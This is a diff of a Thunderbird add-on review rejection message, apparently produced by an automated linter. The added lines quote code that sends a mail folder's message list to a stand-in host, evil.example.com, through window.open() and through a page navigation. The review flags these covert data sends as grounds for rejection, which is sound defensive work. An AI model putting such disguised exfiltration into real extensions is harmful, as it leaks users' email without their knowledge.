@@ -3,10 +3,10 @@
 Thank you for your submission. We appreciate the effort you’ve put into creating this add-on. However, it cannot be accepted and hosted on addons.thunderbird.net in its current form. The following findings caused the submission to be rejected:
 
 1) This add-on appears to send data through a window.open() to a remote URL - a channel not meant for data transmission. Disguising transmission this way is not allowed, even with the user’s consent. Use a normal request and disclose what is sent.
- - background.js:8
+ - background.js:8 - disguised data send (window-open) "https://evil.example.com/?d=" + messenger.messages.list(folderId)
 
 2) This add-on appears to send data through a page navigation - a channel not meant for data transmission. Disguising transmission this way is not allowed, even with the user’s consent. Use a normal request and disclose what is sent.
- - background.js:12
+ - background.js:12 - disguised data send (navigation) "https://evil.example.com/?d=" + messenger.messages.list(folderId)
 
 You can run this automated review yourself before submitting:
 https://github.com/thunderbird/webext-linter
